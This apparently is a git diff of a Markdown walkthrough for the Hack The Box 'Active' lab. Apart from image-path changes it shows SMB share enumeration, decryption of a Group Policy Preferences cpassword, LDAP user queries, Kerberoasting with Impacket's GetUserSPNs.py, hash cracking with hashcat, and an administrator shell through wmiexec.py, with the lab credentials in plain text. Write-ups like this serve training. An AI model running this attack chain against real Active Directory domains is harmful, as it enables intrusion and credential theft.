@@ -32,8 +32,8 @@ wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
 ```
 ----------------------------------------------------------------------------------------------------------------------------------
 ### Namp
-![alt text](image.png)
-![alt text](image-1.png)
+![alt text](Activeimages/image.png)
+![alt text](Activeimages/image-1.png)
 - 1. Understanding the SMB share ports 
 | Port          | Protocol                                   |Service          | Description                                   |
 |---------------|-------------------------------------------|---------------|-------------------------------------------|
@@ -81,18 +81,18 @@ Understanding the LDAP ports
 
 - Now lets come back to the nmap results and found smb ports are availible(Port 445 is open)
 - But guest user is not available but smb signing is happening
-![alt text](image-2.png)
-![alt text](image-3.png)
+![alt text](Activeimages/image-2.png)
+![alt text](Activeimages/image-3.png)
 - So lets try smbclient with available shares and login with anonymous this time
 ```bash
 smbclient -L //10.129.89.194 or \\active.htb
 ```
-![alt text](image-4.png)
+![alt text](Activeimages/image-4.png)
 - Since anonymous login is allowed, we can view a list of available shares. 
 - Let's now use smbmap to identify which of these shares are accessible with anonymous credentials.
-![alt text](image-5.png)
+![alt text](Activeimages/image-5.png)
 - Lets login with anonymous to replication share, and there I can find the active.htb folder and then there are subfolder in it as follows
-![alt text](image-6.png)
+![alt text](Activeimages/image-6.png)
 - To do Multifolder search at the same time in smd we can use the command 
 ```bash
 Inside the SMB />RECURSE ON (enables recursive mode for directory operations, meaning subsequent commands will process files and subdirectories within the current directory.)
@@ -101,11 +101,11 @@ Inside the SMB />RECURSE ON (enables recursive mode for directory operations, me
              />mput *	(Auto-uploads all)
      />del *.tmp	(Deletes without asking)
 ```
-![alt text](image-7.png)
+![alt text](Activeimages/image-7.png)
 - Since the files are donloaded to kali, now lets try to open the each folder and search.
 - After opening the Group.xml file we can see below
 
-![alt text](image-8.png)
+![alt text](Activeimages/image-8.png)
 ```bash
 username :SVC_TGS
 cPassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
@@ -121,14 +121,14 @@ cPassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
 gpp-decrypt "key"
 ```
 - I don’t have this tool installed in kali so downloaded it  using : sudo apt install gpp-decrypt
-![alt text](image-9.png)
+![alt text](Activeimages/image-9.png)
 - Now lets try to map the files that are accessible for SVC_TGS and then we will login
 
-![alt text](image-10.png)
-![alt text](image-11.png)
+![alt text](Activeimages/image-10.png)
+![alt text](Activeimages/image-11.png)
 - After searching the directory of SVC_TGS user we found the user.txt in his desktop folder and downloaded
-![alt text](image-12.png)
-![alt text](image-13.png)
+![alt text](Activeimages/image-12.png)
+![alt text](Activeimages/image-13.png)
 - Note: UserAccountControl 
 - stores settings for each user account (like "Is the account disabled?" or "Does the user need a password?").
 - Each setting is represented by a number code (e.g., 2 = disabled account).
@@ -143,19 +143,19 @@ Excludes disabled accounts                                              :  (!(us
 Requests only the sAMAccountName (username) field                       : samaccountname
 Filters output to show only usernames                                   :| grep sAMAccountName 
 ```
-![alt text](image-14.png)
+![alt text](Activeimages/image-14.png)
 ```bash
 GetADUsers.py	:  A Python script from Impacket that extracts AD user information.
 -all	                              : Retrieves all user accounts (including disabled ones).
 ```
-![alt text](image-15.png)
+![alt text](Activeimages/image-15.png)
 
 - Kerbrosting---> is basically Request a TGS Ticket 
                   The attacker requests a Ticket Granting Service (TGS) ticket for the service (no admin rights needed).
                   The TGS is encrypted with the service account’s NTLM hash.
              Extract the TGS Hash
           The attacker exports the ticket in John-the-Ripper or Hashcat format.
-![alt text](image-16.png)
+![alt text](Activeimages/image-16.png)
 - With the new ldap search filter of serviceprincipalname will search for the possibility of users that can send a TGS 
 ```bash 
 ldapsearch -x -H 'ldap://10.129.89.194' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
@@ -163,25 +163,25 @@ ldapsearch -x -H 'ldap://10.129.89.194' -D 'SVC_TGS' -w 'GPPstillStandingStrong2
 - 
 In the previous command we got the administrator is available as active user. since we can see the serviceprincipleName is active on port 445.
 we can make a service request now.
-![alt text](image-17.png)
+![alt text](Activeimages/image-17.png)
 - Lets reconform with the tool called GetUserSPNs.py  and check weather the same result is happening or not.
 ```bash
 GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.89.194
 ```
-![alt text](image-18.png)
+![alt text](Activeimages/image-18.png)
 - Since it is conforming the same results.
 - so now we can make a request to DC for a service request possibility.
-![alt text](image-19.png)
+![alt text](Activeimages/image-19.png)
 - Now save the ntlm hash into a file and try john or hashcat to decrypt the hash as below
 ```bash
 hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
 ```
-![alt text](image-20.png)
+![alt text](Activeimages/image-20.png)
 - Finally got some credentials (password ) for adminstrator.
 - Lets try login with one of the impack tool called wmiexec.py
 ```bash
 wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.89.194
 ```
 - We have tried login using evil-winrm but it is not working, so we are going with impackts wmiexex.py
-![alt text](image-21.png)
-![alt text](image-22.png)
+![alt text](Activeimages/image-21.png)
+![alt text](Activeimages/image-22.png)
